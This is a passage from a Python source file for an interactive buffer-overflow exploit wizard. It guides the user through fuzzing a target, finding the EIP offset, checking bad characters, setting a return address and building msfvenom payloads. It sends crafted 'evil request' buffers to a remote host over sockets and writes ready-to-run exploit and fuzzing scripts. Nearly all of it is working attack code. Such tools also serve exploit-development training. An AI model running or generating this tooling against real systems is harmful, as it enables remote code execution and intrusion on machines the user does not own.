		if number_valid(value):
			global increase_step
			increase_step = int(value)
		else:
			print_error('Invalid value for this parameter')
	elif parameter == 'fuzz_char':
		if value.isalnum() and len(value) == 1:
			global fuzz_char
			fuzz_char = value.encode()
		else:
			print_error('Invalid value for this parameter')
	elif parameter == 'pattern':
		if number_valid(value):
			pattern_length = int(value) - len(start_command) - len(end_command)
		else:
			print_error('Invalid value for this parameter')
	elif parameter == 'buffer_length':
		if number_valid(value):
			global buf_length
			buf_length = int(value)
		else:
			print_error('Invalid value for this parameter')
	elif parameter == 'offset':
		if number_valid(value):
			global offset
			offset = int(value)
		else:
			print_error('Invalid value for this parameter')
	elif parameter == 'nop_sled':
		if number_valid(value):
			global nop_sled
			nop_sled = int(value)
		else:
			print_error('Invalid value for this parameter')
	elif parameter == 'nop_padding':
		if number_valid(value):
			global nop_padding
			nop_padding = int(value)
		else:
			print_error('Invalid value for this parameter')
	elif parameter == 'return':
		if address_valid(value):
			global return_address
			return_address = struct.pack('<L', int(value, 16))
		else:
			print_error('Invalid value for this parameter')
	elif parameter == 'payload':
		if payload_valid(value):
			global payload
			payload = value
			create_payload()
		else:
			print_error('Invalid value for this parameter')
	elif parameter == 'arch':
		if arch_valid(value):
			global arch
			arch = 'x' + value
		else:
			print_error('Invalid value for this parameter')
	elif parameter == 'platform':
		if platform_valid(value):
			global platform
			platform = value
		else:
			print_error('Invalid value for this parameter')
	else:
		print_error('Invalid parameter')


def set_step(value):
	"""
	Opens the given step
	:param value: (int) Step
	"""
	try:
		number = int(value)
		if 0 < number > 5:
			raise ValueError
		global current_step
		current_step = number
		steps = [step_fuzzing, step_pattern, step_offsets, step_badchars, step_return, step_payload]
		steps[number]()
	except ValueError:
		print_error('Invalid input. You can only select step 0 to 5.')
		return False


# -----------------------------------------------------------------------------
# Print options / help
# -----------------------------------------------------------------------------
def show_help():
	"""
	Prints all supported commands
	"""
	commands = [
		['Command', 'Description'],
		['exit / quit', 'Closes the wizard'],
		['dump exploit', 'Creates an exploit file based on the current settings'],
		['help', 'Shows this list with all supported commands'],
		['set', 'Sets a parameter, examples: set step 3, set target 10.10.10.1'],
		['show ascii', 'Shows all ASCII characters that are currently allowed in this exploit'],
		['show options', 'Shows which values are currently set for all parameters'],
		['show payloads',
		 'Shows all possible Metasploit payloads based on your settings for platform and architecture'],
		['show steps', 'Shows all wizard steps and highlights the current step']
	]
	dash = '-' * 77
	for index, value in enumerate(commands):
		if index == 0:
			print(BOLD, GRAY)
			print('{:<15s}{:s}'.format(value[0], value[1]))
			print(dash, FORMAT_END)
		else:
			print('{:<15s}{:s}'.format(value[0], value[1]))
	print('\n')


def show_options():
	"""
	Prints the currently set values of all parameters
	"""
	dash = '-' * 77
	header = ['Name', 'Current setting', 'Required', 'Description']
	options = [
		[
			['Global parameters'],
			desc_bo_type(),
			desc_start_command(),
			desc_end_command()
		],
		[
			['Local buffer overflow parameters'],
			desc_file_name(),
			desc_file_ext()
		],
		[
			['Remote buffer overflow parameters'],
			desc_target(),
			desc_port()
		],
		[
			['Fuzzing'],
			desc_fuzz_buff_length(),
			desc_increase_step(),
			desc_fuzz_char()
		],
		[
			['Buffer'],
			desc_pattern(),
			desc_buf_length(),
			desc_offset(),
			desc_badchars(),
			desc_nop_sled(),
			desc_nop_padding(),
			desc_return_address()
		],
		[
			['Payload'],
			desc_payload(),
			desc_arch(),
			desc_platform(),
			desc_connect_ip(),
			desc_connect_port()
		]
	]
	# Header
	print(BOLD, GRAY)
	print('{:<15s}{:<20}{:<15s}{:<30s}'.format(header[0], header[1], header[2], header[3]))
	print(dash, FORMAT_END)
	# Parameters
	for item in options:
		for index, value in enumerate(item):
			if index == 0:
				print(BOLD, GRAY)
				print(value[0].upper(), FORMAT_END)
			else:
				print('{:<15s}{:<20}{:<15s}{:<30s}'.format(value[0], value[1], value[2], value[3]))
	print('\n')


def show_settings(settings):
	"""
	Shows parameters and their currently set values
	:param settings: List with parameter descriptions to display
	"""
	header = ['Parameter', 'Current setting', 'Description']
	print('{}{}{:<15s}{:<20}{:<30s}{}'.format(BOLD, GRAY, header[0], header[1], header[2], FORMAT_END))
	for item in settings:
		print('{}{:<15s}{:<20}{:<30s}{}'.format(GRAY, item[0], item[1], item[3], FORMAT_END))
	print('\nIf you wish to change these settings, enter {}set <parameter> <value>{}\n'.format(BOLD, FORMAT_END))


def show_steps():
	"""
	Displays all steps of the wizard and marks the currently selected step
	"""
	print('\nThe wizard guides you through the following steps:')
	steps = ['Fuzzing',
			 'Send pattern to find offset for EIP',
			 'Check offsets',
			 'Check bad characters',
			 'Check return address',
			 'Create payload']
	for index, value in enumerate(steps):
		if index == current_step:
			print('{}=>[{}] {} {}'.format(CYAN, index, value, FORMAT_END))
		else:
			print('{}  [{}] {} {}'.format(GRAY, index, value, FORMAT_END))
	print('The prompt shows your current step.')
	print('You can switch between steps at any time with {}set step <number>{}\n'.format(BOLD, FORMAT_END))


def show_payloads():
	"""
	Shows all payloads available in Metasploit based on the current values for architecture and platform
	"""
	tmp_file = 'payloads.txt'
	command = 'msfvenom -l payloads > {}'.format(tmp_file)
	thread = call_command(command)
	while thread.running():
		animation('Searching payloads in msfvenom')
	if thread.result() == 0:
		print()
		with open(tmp_file, 'r') as f:
			for line in f:
				splitted = line.split(' ')
				if len(splitted) > 5:
					name = splitted[4]
					if platform in name:
						if arch == 'x86' and 'x64' not in name:
							print(name)
						elif arch == 'x64' and 'x86' not in name:
							print(name)
		os.unlink(tmp_file)


def show_ascii():
	"""
	Shows all ASCII characters in a matrix (helps finding bad chars)
	"""
	hexed = char_string.hex()
	listed = [hexed[i:i + 2] for i in range(0, len(hexed), 2)]
	cols = 16
	lines = ("  ".join(listed[i:i + cols]) for i in range(0, len(listed), cols))
	print('\n')
	print('\n'.join(lines))


# -----------------------------------------------------------------------------
# Print formatting
# -----------------------------------------------------------------------------
# Print formatted output to the console
# -----------------------------------------------------------------------------
def print_error(message):
	print(RED, '[!] ', message, FORMAT_END)


def print_success(message):
	print(GREEN, '[*] ', message, FORMAT_END)


def print_warning(message):
	print(YELLOW, '[!] ', message, FORMAT_END)


def print_info(message):
	print(GRAY, '[i] ', message, FORMAT_END)


def show_prompt():
	if current_step >= 0:
		prompt = '\n{}{}wizard ({} | {}) > {}'.format(BOLD, CYAN, bo_type, current_step, FORMAT_END)
	else:
		prompt = '\n{}{}wizard > {}'.format(BOLD, CYAN, FORMAT_END)
	return prompt


def show_prompt_text(text, show_lines=True):
	prompt_len = len(show_prompt())
	if show_lines:
		print(' ' * (prompt_len - 19), '░▒▓', text)
	else:
		print(' ' * (prompt_len - 15), text)


def show_step_banner(title):
	print(YELLOW)
	print('~' * 60)
	print('  ' + title)
	print('~' * 60)
	print(FORMAT_END)


# -----------------------------------------------------------------------------
# Threading
# -----------------------------------------------------------------------------
def animation(name):
	chars = "/—\|"
	for char in chars:
		sys.stdout.write('\r' + name + ' in progress... ' + char)
		time.sleep(.1)
		sys.stdout.flush()


def threadpool(f, executor=None):
	def wrap(*args, **kwargs):
		return (executor or _DEFAULT_POOL).submit(f, *args, **kwargs)

	return wrap


@threadpool
def call_command(command):
	status = sub.call(command, stdout=sub.DEVNULL, stderr=sub.DEVNULL, shell=True)
	return status


# -----------------------------------------------------------------------------
# Send and dump exploit
# -----------------------------------------------------------------------------
def run_remote_exploit():
	"""
	Asks the user if the remote exploit should be run automatically
	"""
	show_prompt_text('You can check and run the exploit file manually or press Enter to let the wizard run it.')
	show_prompt_text('Enter "skip" to proceed without running the file.', False)
	if get_input(check_text) == 'skip':
		return
	else:
		send_exploit()


def send_exploit():
	"""
	Sends a request with the payload for a remote buffer overflow
	"""
	try:
		with so.socket(so.AF_INET, so.SOCK_STREAM) as s:
			s.settimeout(5)
			print_info('Connecting to {}'.format(target))
			connect = s.connect_ex((target, port))
			# Stop if connection cannot be established
			if connect != 0:
				print_error('Connection failed')
				return
			# Connection established: send request
			try:
				# Catch initial response if any
				try:
					print('[*] Received response: ' + str(s.recv(1024)))
				except so.timeout:
					pass
				print_info('Sending evil request with {} bytes'.format(len(buffer)))
				s.send(buffer)
				print_success('Done')
			# Stop on timeout
			except so.timeout:
				print_error('Connection failed due to socket timeout')
	except (BrokenPipeError, ConnectionResetError):
		print_error('The connection was closed while sending the payload')


def run_remote_fuzzing():
	"""
	Asks the user if the remote exploit should be run automatically
	"""
	show_prompt_text('You can check and run the fuzzing file manually or press Enter to let the wizard run it.')
	show_prompt_text('Enter "skip" to proceed without running the file.', False)
	if get_input(check_text) == 'skip':
		return
	else:
		send_fuzzing()
		print_info('Fuzzing finished')


def send_fuzzing():
	"""
	Sends requests with increasing payloads to cause a remote buffer overflow
	"""
	build_fuzz_buffer()
	try:
		for item in fuzz_buffer:
			with so.socket(so.AF_INET, so.SOCK_STREAM) as s:
				s.settimeout(5)
				print_info('Connecting to ' + target)
				connect = s.connect_ex((target, port))
				# Stop if connection cannot be established
				if connect != 0:
					print_error('Connection failed')
					return
				# Connection established: send request
				try:
					# Catch initial response if any
					try:
						print('[*] Received response: ' + str(s.recv(1024)))
					except so.timeout:
						pass
					command = start_command + item + end_command
					print_info('Fuzzing with {} bytes'.format(len(command)))
					s.send(command)
					try:
						print('[*] Received response: ' + str(s.recv(1024)))
					except so.timeout:
						pass
					print_success('Done')
				# Stop on timeout
				except so.timeout:
					print_error('Connection failed due to socket timeout.')
					return
	except (BrokenPipeError, ConnectionResetError):
		print_error('The connection was closed while sending the payload')


def dump_local_exploit():
	"""
	Creates a file with the payload for a local buffer overflow
	"""
	global file
	global buffer
	try:
		with open(file, 'wb') as f:
			f.write(buffer)
		print_success('Created / modified file with length {}'.format(len(buffer)))
	except OSError as ex:
		print_error('Error while creating the exploit file:\n {}'.format(ex.strerror))


def dump_remote_exploit():
	"""
	Writes a python file with the exploit based on the currently set parameters
	"""
	global file
	content = '''\
#!/usr/bin/python3
import socket as so

# --- Define target ------------------------
target = '{target}'
port = {port}
# ------------------------------------------

# --- Define exploit ------------------------
buf_length = {buffer}
offset = {off}
buffer = {buffer_code}
# ------------------------------------------

with so.socket(so.AF_INET, so.SOCK_STREAM) as s:
	try:
		s.settimeout(5)
		print(' [*] Connecting to', target)
		connect = s.connect_ex((target, port))

		# Stop script if connection cannot be established
		if connect != 0:
			print('[!] Connection failed')
			exit(1)

		# Connection established: send request
		try:
			# Catch initial response if any
			try:
				print('[*] Received response: ' + str(s.recv(1024)))
			except so.timeout:
				pass
				
			print(' [*] Sending evil request with', len(buffer), 'bytes')
			s.send(buffer)
			print('[*] Done')

		# Stop on timeout
		except so.timeout:
			print('[!] Connection failed due to socket timeout.')
			exit(1)
	except (BrokenPipeError, ConnectionResetError):
		print('[!] The connection was closed while sending the payload')
'''.format(target=target,
		   port=port,
		   buffer=buf_length,
		   off=offset,
		   buffer_code=buffer)
	try:
		with open(file, 'w') as f:
			f.write(content)
		print_success('Created exploit file {}'.format(file))
	except OSError as ex:
		print_error('Error while creating the exploit file:\n {}'.format(ex.strerror))


def update_remote_exploit():
	"""
	Updates only the buffer in an existing exploit file.
	Manual changes in other parts of the file will be retained.
	"""
	try:
		with FileInput(files=[file], inplace=True) as f:
			for line in f:
				line = line.rstrip()
				if line.startswith('buffer = '):
					line = 'buffer = {}'.format(buffer)
				print(line)
		print_success('Updated buffer in exploit file {}'.format(file))
	except OSError as ex:
		print_error('Error while updating the exploit file:\n {}'.format(ex.strerror))


def build_fuzz_buffer():
	"""
	Generates the buffer for fuzzing based on the currently set parameters for
	fuzz_length, fuzz_increase and fuzz_char
	"""
	counter = increase_step - len(start_command) - len(end_command)
	while len(fuzz_buffer) <= fuzz_buff_length:
		fuzz_buffer.append(fuzz_char * counter)
		counter = counter + increase_step


def dump_local_fuzz():
	"""
	Writes files with increasing size for fuzzing
	"""
	build_fuzz_buffer()
	# Create files
	for item in fuzz_buffer:
		filename = file_name + '_' + str(len(item)) + '.' + file_ext
		with open(filename, 'wb') as f:
			f.write(start_command + item + end_command)
		print_info('Created fuzzing file with length ' + str(len(item)))


def dump_remote_fuzz():
	"""
	Writes a python file for fuzzing based on the currently set parameters for fuzz_length, fuzz_increase and fuzz_char
	"""
	filename = 'fuzzing.py'
	content = '''\
#!/usr/bin/python3
import socket as so

# --- Define target ------------------------
target = '{target}'
port = {port}
# ------------------------------------------

# --- Build fuzzing buffer -----------------
fuzz_buffer = []
counter = {step} - len({cmd}) - len({ecmd})
while len(fuzz_buffer) <= {buff_len}:
    fuzz_buffer.append({char}*counter)
    counter = counter + {step}
# ------------------------------------------

for item in fuzz_buffer:
	with so.socket(so.AF_INET, so.SOCK_STREAM) as s:
		try:
			s.settimeout(5)
			print(' [*] Connecting to', target)
			connect = s.connect_ex((target, port))

			# Stop script if connection cannot be established
			if connect != 0:
				print('[!] Connection failed')
				exit(1)

			# Connection established: send request
			try:
				# Catch initial response if any
				try:
					print('[*] Received response: ' + str(s.recv(1024)))
				except so.timeout:
					pass
				command = {cmd} + item + {ecmd}
				print(' [*] Fuzzing with', len(command), 'bytes')
				s.send(command)
				try:
					print('[*] Received response: ' + str(s.recv(1024)))
				except so.timeout:
					pass
				print('[*] Done')

			# Stop on timeout
			except so.timeout:
				print('[!] Connection failed due to socket timeout.')
				exit(1)	
		except (BrokenPipeError, ConnectionResetError):
			print('[!] The connection was closed while sending the payload')
			exit(1)
'''.format(target=target,
		   port=port,
		   step=increase_step,
		   buff_len=fuzz_buff_length,
		   char=fuzz_char,
		   cmd=start_command,
		   ecmd=end_command)
	try:
		with open(filename, 'w') as f:
			f.write(content)
		print_success('Created fuzzing file {}'.format(filename))
	except OSError as ex:
		print_error('Error while creating the fuzzing file:\n {}'.format(ex.strerror))


###############################################################################
# Start wizard
###############################################################################
if __name__ == '__main__':
	if not check_dependencies():
		exit(1)
	# Intro
	print_welcome()
	show_steps()
	# Walk through steps or let user work freely
	show_prompt_text(
		'Enter {}start{} to walk through the wizard step by step or make your settings manually.'.format(BOLD,
																										 FORMAT_END))
	show_prompt_text('Enter {}show help{} to get help.'.format(BOLD, FORMAT_END))
	start_input = get_input(intro_valid)
	if start_input == 'start':
		select_bo_type()
		# Walk through steps
		start_steps()
	else:
		# Show prompt till exit
		get_input(generic_check)
